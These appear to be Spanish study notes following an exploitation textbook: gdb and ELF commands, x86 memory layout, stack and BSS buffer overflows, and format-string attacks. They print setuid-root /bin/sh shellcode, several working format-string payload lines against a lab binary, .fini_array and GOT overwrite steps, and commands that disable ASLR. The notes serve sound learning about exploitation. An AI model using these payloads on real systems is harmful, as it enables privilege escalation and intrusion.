* 0x200 Programming
  + objdump -D -M intel a.out :: disassembly (-D) con formato Intel (-M intel)
  + gdb -q ./a.out :: debugger para ver el estado de la memoria y los registros al momento de ejecucion. No imprime
		      mensajes introductorios ni la licencia (-q o -quiet)
    + help <command> :: ayuda sobre el comando
    + break main :: pone un breakpoint en el label "main"
    + info registers :: imprime informacion sobre los registros en el momento actual de ejecucion
    + info register eip (short i r eip) :: informacion particularmente sobre el EIP
    + set disassembly-flavor intel :: cambia el formato de AT&T a Intel
    + list :: si fue compilado con *-g*, muestra el codigo fuente del programa
	      puede tomar argumentos como el #linea, nombre de la funcion, etc.
    + disassemble main :: desensambla la funcion deseada y la muestra
    + x/FORMAT ADRESS :: para *examinar* la memoria. FORMAT puede estar formado por:
      + n :: un numero para indicar la cantidad de "units" a examinar
      + t(binario) | o(octal) | u(decimal sin signo) | x(hexa) :: en que medida mostrar el "unit"
      + b(byte) | h(half word) | w(word default) | g(giant) :: tamanio del "unit"
      Por ejemplo, puede quedar asi: x, 2x, 4xb, etc.
      FORMAT tambien puede tomar valores como *i(instruccion), a(address), c(char), s(string)*.
      ADRESS es una expresion para la direccion de memoria a examinar. $eip o 0x8048384 por ejemplo.
    + print $ebp - 4 :: se usa para matematica simple, y guarda el resultado en una variable, para usarlo luego.
    + run :: corre el programa, parando en los breakpoints (si es que los hay)
    + continue (short cont) :: continua la ejecucion
    + nexti :: ejecutar la actual instruccion.
    + bt [full] o where :: backtrace the call stack. Con 'full' muestra las variables locales del stack frame
    + quit
  + EAX :: accumulator register
  + ECX :: counter register
  + EDX :: data register
  + EBX :: base register
  + ESP :: stack pointer
  + EBP :: base pointer
  + ESI EDI :: source and destination index: used to point to the source and dest when data needs to be read from or written to
  + EIP :: instruction pointer register
  + EFLAGS :: bit flags for comparisons and memory segmentation

  + bc -ql :: basic calculator

  + C variable global :: se declara igual a las demas, pero fuera de cualquier funcion

  + C variable estatica :: es local a la funcion en la que se declara, pero se comparte entre todos los 
       llamados a la misma
  
** 0x270 Memory Segmentation
   La memoria de un programa (compilado) esta dividida en 5 segmentos: text, data, bss, heap & stack
   + text segment :: tambien llamado /code segment/, es donde se guarda el codigo.
		     Tiene un tamanio fijo, ya que nunca nada cambia aqui, y /no/ es writeable.
		     El ser no-writeable permite seguridad y que se utilize para cada instancia de
		     el programa.
   + data & bss segments :: almacena las variables globales y estaticas. *data* tiene las variables
	inicializadas, mientras que *bss* tiene las /no/ inicializadas. Tiene tamanio fijo y es writeable.
   + heap segment :: segmento de memoria que el programador puede controlar directamente. /No/ tiene tamanio
		     fijo, ya que el programador puede almacenar y liberar bloques de memoria. El crecimiento
		     del heap es /graficamente/ hacia abajo, hacia posiciones de memoria mas grandes.
   + stack segment :: segmento para guardar las variables locales y el contexto de las funciones. Ya que
		      el contexto y el EIP deben cambiar cuando se llama a una funcion, se utiliza el stack
		      para recordar (este conjunto se llama *stack frame*):
     - las variables pasadas como argumentos
     - las variables locales de la funcion
     - SFP :: el *saved frame pointer* se usa para reestablecer el *EBP* a su anterior estado
     - return address :: puntero para poner el *EIP* en la posicion correspondiente al retornar
     El *EBP* (tambien llamado frame pointer) es un puntero usado para referenciar las variables locales 
     dentro del stack frame actual
     El stack no tiene tamanio fijo, y crece /graficamente/ hacia arriba, hacia las
     posiciones mas bajas de la memoria.
		      
   Al hacer un llamado a una funcion, el stack frame se compone con lo siguiente: 
   1) primero se pushean los argumentos a la funcion
   2) luego (en el call) se pushea la direccion de retorno
   3) se pushea el EBP, con lo que se lo almacena para luego recuperarlo cuando se debe retornar a ese contexto
   4) se apunta el EBP al actual SP, para tomar la pos. de las var locales en relacion a este punto
   5) se crea el espacio para almacenar las variables locales de la funcion

      
   		
** 0x280 Building on Basics
   Hay dos maneras principales para acceder a archivos desde C:
   + File Descriptors :: conjunto de funciones de *bajo nivel* de I/O
   + Filestreams :: buffered I/O construida sobre las otras funciones de bajo nivel
* 0x300 Exploitation
** SHELLCODE desde el stack
   La idea en [[file:~/workspace/hacking-taoe/0x300_Exploitation/exploit_notesearch.c::#include%20<stdio.h][exploit_notesearch.c]] es crear un buffer que tenga una serie de NOP's, las instrucciones 
   (shellcode) que queremos que se ejecuten, y un bloque de "return adresses" (RA).
   Ese buffer se appendea a un string del tipo "./notesearch ..." y se lo ejecuta con la funcion *system*.

   Una vez ejecutado el programa ./notesearch (vulnerable a buffer overflow en donde recibe el parametro a 
   buscar entre las notas del usuario), el overflow hace que se sobreescriba el stack (donde estan las
   variables locales) con el comando armado en *exploit_notesearch*. La idea es, en primer lugar, lograr 
   sobreescribir el return address (RA) del main con la deseada por nosotros. Como el lugar exacto del RA
   dentro del stack frame puede variar por algunos bytes, se pone un bloque mediano con ese RA repetido 
   para que alugno de todos ellos pise al verdadero.

   Luego de pisar el RA, cuando la funcion *main* termine de ejecutar y quiera retornar al lugar de donde
   fue llamada, el RA alterado va a hacer que salte hacia donde nosotros queremos. Esto es, el bloque de NOP's
   (no operation) que anteceden al shellcode. El objetivo de estos NOPs es crear un margen "grande" a donde 
   puede apuntar el RA, ya que no se puede saber con exactitud en que lugar del stack se va a ubicar el shellcode.
   El resultado es que la ejecucion pase por los NOP's y termine cayendo en el shellcode.

   Como estimamos que RA ponerle? Considerando que las variables locales de *notesearch* estan por encima
   de las del main() de *exploit_notesearch* en el stack (posiciones de memoria mas bajas), podemos utilizar 
   la posicion de una variable de este ultimo y restarle X cantidad de bytes por la informacion anterior.
   Aqui se debe jugar con ese valor, pero teniendo en cuenta que queremos saltar a alguna parte de ese bloque
   de NOP's (para que la ejecucion termine cayendo al codigo inyectado) y que el stack frame de *notesearch*
   esta en posiciones mas bajas del stack.
   
** Para probar el shellcode
   Escribir el binario con un editor hexa (mc o Emacs con hexl-mode sirven). Ahi vamos escribiendo los
   valores en hexadecimal, que luego pueden ser pasados por un programa como *objdump* para ver que
   instrucciones representan en assembler: ~objdump -D <file> -m i386 -b binary~
  
   La secuencia:
   31c0 31db 31c9 99b0 a4cd 806a 0b58 5168
   2f2f 7368 682f 6269 6e89 e351 89e2 5389 
   e1cd 80                              

   representa el siguiente codigo en asm:
#+NAME: shellcode
#+BEGIN_SRC asm
00000000 <.data>:
   0:   31 c0                   xor    %eax,%eax
   2:   31 db                   xor    %ebx,%ebx
   4:   31 c9                   xor    %ecx,%ecx
   6:   99                      cltd   
   7:   b0 a4                   mov    $0xa4,%al
   9:   cd 80                   int    $0x80
   b:   6a 0b                   push   $0xb
   d:   58                      pop    %eax
   e:   51                      push   %ecx
   f:   68 2f 2f 73 68          push   $0x68732f2f
  14:   68 2f 62 69 6e          push   $0x6e69622f
  19:   89 e3                   mov    %esp,%ebx
  1b:   51                      push   %ecx
  1c:   89 e2                   mov    %esp,%edx
  1e:   53                      push   %ebx
  1f:   89 e1                   mov    %esp,%ecx
  21:   cd 80                   int    $0x80
#+END_SRC
   
   La instruccion ~int $0x80 (syscall)~ es una interrupcion especial al kernel. Expresa que el programa le 
   esta pidiendo una accion especial al kernel. El interrupt 0x80 toma de EAX el llamado a realizar. 
   En este caso, resulta ~eax = 0xa4 (164)~, que, viendo en [[/usr/include/i386-linux-gnu/asm/unistd_32.h][unistd_32.h]], significa que se va a ejecutar la 
   funcion *setresuid* (existe una funcion wrapper en C, de ese nombre).
   
   Esa funcion va a poner en 0 el usuario "real", "efectivo" y "saved set" (saved set-user-ID) del programa, 
   por lo que va a ejecutarse como ROOT (UID=0).

   La proxima interrupcion ~int $0x80~ se hace con el valor *0xb en EAX*, por lo que se ejecuta la funcion
   *execve* (ejecutar programa). En EBX se pone un puntero al string "/bin//sh" (multiples slashes equivalen 
   a uno solo, segun unix), para que forme el primer argumento de *execve* (const char* filename). En ECX
   (argumento char const* argv[]) se pone un puntero a EBX, porque la convencion es que al programa 
   llamado se le pase el nombre completo de si mismo como primer argumento.

   Para que el shellcode (que se aloja en el stack) pueda ejecutarse, el programa debe compilarse sin algunas 
   medidas de seguridad, esto es, con los flags:
   + -fno-stack-protector
   + -z execstack

   Otra medida de seguridad importante implementada en el kernel es ASLR (address space layout randomization)
   Esto hace que los programas se carguen en memoria con distintas direcciones cada vez. 
   + desactivarlo :: ~echo "0" | [sudo] dd of=/proc/sys/kernel/randomize_va_space~
   + activarlo :: ~echo "2" | [sudo] dd of=/proc/sys/kernel/randomize_va_space~

** Utilizando el ENVIRONMENT
   Otra manera (mas facil) de lograr ejecutar shellcode inyectado en la memoria es a travez de 
   las variables de ambiente. Cuando se crea una, por ejemplo desde bash con ~VAR=asdf~, sucede que esa
   variable va a formar parte del "ambiente" de un programa, y va a aparecer en el stack.

   Funciones como ~getenv(char *varname)~ se utilizan para obtener la direccion en el stack de una 
   variable de ambiente. Esa direccion se puede utilizar para, con un buffer overflow, pisar el return
   address de la funcion u otro caso para dirigir el flujo (alterado) del programa a donde se desee. 
   La variable de ambiente podemos formarla de nuevo con una tira de NOPs y el SHELLCODE. Pero, a 
   diferencia de los buffers dentro de un programa, las variables de ambiente pueden ser mucho mas grandes, 
   y por lo tanto el RA alterado no esta obligado a ser tan preciso. De todos modos, siertos factores 
   permiten incluso eliminar la necesidad del NOP sled:
   + Sin ASLR (address space layout randomization) la direccion donde empieza el environment de un proceso
   es antes (dirs menores) de 0xbffffffc.
   + El nombre del ejecutable influye en la direccion de la variable. Esto sugiere que antes, en el stack, 
     tenemos el nombre del ejecutable y luego el ambiente.

   El programa "exploit_notesearch_env.c" muestra un exploit confiable. El objetivo es preparar la ejecucion
   del programa "notesearch.c" (vulnerable a buffer overflow) con el ambiente modificado, para que /solo/
   contenga el shellcode. Con la info anterior se puede preparar la direccion con la que sobreescribir el
   RA de "notesearch", ya que sabemos donde arranca el ENVIRONMENT, cual es la longitud del nombre del 
   ejecutable, la longitud del SHELLCODE, y que va a ser el unico valor del environment.
** Overflows en otros segmentos de la memoria (BSS, Heap)
   El programa "game_of_choice.c" es vulnerable a buffer overflow. La estructura que representa al jugador
   esta alojada en el BSS Segment y tiene un char[] (nombre del jugador) previo a un *function (actual juego).
   Un overflow cargando el nombre del jugador permite sobreescribir el puntero al juego actual. Eso hace que
   se dirigir la ejecucion a un punto clave del programa.

   Para ver los simbolos de un binario se puede utilizar el comando ~nm~. Usandolo podemos ver, por ejemplo,
   la direccion de la funcion "jackpot" y luego dirigir la ejecucion alli, para obtener creditos gratis.

** Format Strings
   Si bien el exploit de Format Strings no es comun, puede ocurrir que un programa este mal desarrollado
   y presente lo siguiente:
   
   ~printf(argv[1]);~
   
   Aqui el usuario puede generar un format string que lea o escriba posiciones de memoria arbitrariamente.
   Sucede que si el primer argumento a ~printf~ (el format string) es, por ejemplo, "Hola %x", la funcion
   va a interpretar que tiene un argumento extra para llenar el lugar del parametro "%x" y va a leer la 
   posicion del stack donde deberia estar el argumento. Poniendo multiples "%x" (u otro formato) vamos a
   leer posiciones consecutivas del stack, cada vez mas altas. Considerar que al momento 
   del llamado a ~printf~ es ella quien esta en el tope del stack. Si el string es almacenado en una variable
   local, eventualmente vamos a poder leerlo.

   Un argumento como "AAAA%x%x%x%s" se puede utilizar para leer posiciones arbitrarias de memoria. 
   ~printf~ va a leer posiciones de memoria del stack (por cada %x) y eventualmente vamos a llegar a leer
   los mismisimos valores del string que le pasamos. Por ello, si colocamos el valor de una direccion de 
   memoria (en donde estan las "AAAA") y lo usamos justo con el formato "%s", ~printf~ va a utilizar ese
   "puntero" y va a imprimir el valor de la posicion de memoria apuntada.

   Ademas de %d, %u, %x y %s existen otros formatos, entre los que se encuentra %n. Este es especial en el
   sentido que escribe en lugar de leer. Cuando aparece en un format string, y como argumento extra a 
   ~printf~ se le pasa la direccion de una variable, la funcion va a almacenar alli la cantidad de bytes 
   escritos hasta el momento en el que "%n" aparece. 
   Utilizando la tecnica anterior (combinar una direccion de memoria y el %s para leer memoria) pero esta 
   vez con %n, podemos hacer que ~printf~ escriba en la memoria que le indiquemos. El unico problema es que
   el valor a escribir esta determinado por la cantidad de bytes escritos por la funcion hasta ese momento,
   y poder poner valores muy grandes es imposible (porque deberiamos escribir mucho antes del %n).
   Una solucion es hacerlo en multiples escrituras, donde cada una se hace con la posicion de memoria 
   aumentada en 1 (o mas, por si usamos wrap-around), para que el ultimo byte de los 4 se conserve.

*** Ejemplos
   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08"."\xd1\x98\x04\x08"."\xd2\x98\x04\x08"."\xd3\x98\x04\x08"').%169x.%08x.%08x.%n.$(perl -e 'print "A"x220').%n.$(perl -e 'print "A"x89').%n.$(perl -e 'print "A"x256').%n~   
   Tiene 613 bytes de longitud

   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08"."JUNK"."\xd1\x98\x04\x08"."JUNK"."\xd2\x98\x04\x08"."JUNK"."\xd3\x98\x04\x08"."%8x%8x%161x"."%n"."%222x"."%n"."%91x"."%n"."%258x"."%n"')~
   Tiene 62 bytes de longitud. En lugar de aumentar los bytes escritos mediante directamente desde el format
   string, utiliza el min-width con (%nnnx) de los "JUNK" entre cada direccion. Esto permite que el format
   string sea chica, a pesar de imprimir una cantidad grande de caracteres.

   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08\xd1\x98\x04\x08\xd2\x98\x04\x08\xd3\x98\x04\x08"."%98x"')'%4$n%1$139x%5$n%1$258x%6$n%1$192x%7$n'~
   Este ultimo ejemplo usa 58 bytes. Emplea "direct parameters" para utilizar directamente el parametro
   indicado por "n$". Eso hace innecesaros los "JUNK" y los "%100x" entre las address para ir aumentando
   los bytes escritos

   Este metodo simplifica el proceso de escribir en una posicion de memoria arbitraria y achica el size
   necesario del format string.

   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08"."\xd2\x98\x04\x08"')'%49143x%5$hn%15731x%4$hn' ~
   Este ejemplo emplea "short writes" para conseguir el mismo resultado con solo 33 bytes.
   "short write" consiste en agregarle "h" como prefix para los formatos d, x, n, etc., haciendo que impriman
   o escriban media palabra (2 bytes). 


    
      
** CTORS & DTORS (info del binario)
   Los siguientes son ejemplos de programas y opciones para obtener info de un ELF file.
   "executable & linkable file" es un formato estandar de archivo que contiene la informacion necesaria
   para hacer de un binario algo linkeable con otros modulos y ejecutable. Describes how to create a 
   process/memory image for runtime execution.
   

   + file /bin/ps :: info general sobre el tipo de archivo
   + readelf -h|--file-header :: muestra el header del archivo elf
   + readelf -l|--program-headers|--segments :: info sobre los segmentos. el kernel los usa para mapear la 
	memoria virtual, usando el syscall mmap(2).
   + ldd /bin/ps :: normalmente los binarios son "dinamicos" (en lugar de "estaticos") y usan componentes
		    externos para funcionar, como por ejemplo librerias.
   + readelf -S|--section-headers|--sections :: info sobre las secciones (.text, .data, .bss, .rodata)
   + objdump -s -j .fini_array /bin/ps :: ver la seccion .fini_array
	
   Para ver esta explicacion en mas detalle ver [[https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/][The 101 of ELF Binaries]].

*** Ejemplo 1
    Los siguientes pasos muestran como utilizar un programa vulnerable para ejecutar shellcode:
    1) objdump -h fmt_vuln | grep '.fini_array'  
    2) ./getenvaddr SHELLCODE ./fmt_vuln
    3) gdb -q --batch -ex 'p 0xbfff - 8'
    4) gdb -q --batch -ex 'p 0xf65f - 0xbfff'
    5) ./fmt_vuln $(perl -e 'print "\xac\x97\x04\x08\xae\x97\x04\x08"')'%49143x%5$hn%13920x%4$hn'

    En los puntos *1 y 2* se ve en que posiciones de memoria van a ubicarse: *1* la tabla ".fini_array", 
    que es una lista de direcciones de las funciones encargadas de la finalizacion del programa; y en *2*
    la variable de entorno "SHELLCODE" (que contiene el codigo a ejecutar).

    En los puntos *3 y 4* se calculan los bytes a escribir con el *printf* vulnerable para fabricar el valor
    que queremos escribir en la tabla ".fini_array".

    En el punto *5* ejecutamos el progama con un argumento preparado para aprovechar el printf vulnerable.

*** Ejemplo 2
    1) objdump -R fmt_vuln | grep exit
    2) ./getenvaddr SHELLCODE ./fmt_vuln
    
    Este ejemplo utiliza dos secciones (PLT y GOT) del binario encargadas de la ubicacion de las 
    "shared libraries". En el punto *1* conseguimos la posicion de un puntero a la funcion *exit()*, con
    el objetivo de sobreescribirlo y asi, cuando se quiera ejecutar dicha funcion (que es provista por 
    una shared library), en su lugar se va a ejecutar el SHELLCODE.
* 0x400 Networking
  Programs can become much more powerful when they have the ability to communicate with each other
  via a network.
* 0x600 Countermeasures
  (gdb) i r esp ebx ebp
  esp            0xbffff340       0xbffff340
  ebx            0xb7fc0000       -1208221696
  ebp            0xbffff388       0xbffff388
  (gdb) cont
  Continuing.
  
  Program received signal SIGTRAP, Trace/breakpoint trap.
  0xbffff2b3 in ?? ()
  (gdb) i r esp ebx ebp
  esp            0xbffff340       0xbffff340
  ebx            0x6      6
  ebp            0xbffff25c       0xbffff25c
  
  (gdb) print /x 0xbffff388 - 0xbffff25c
  $2 = 0x12c
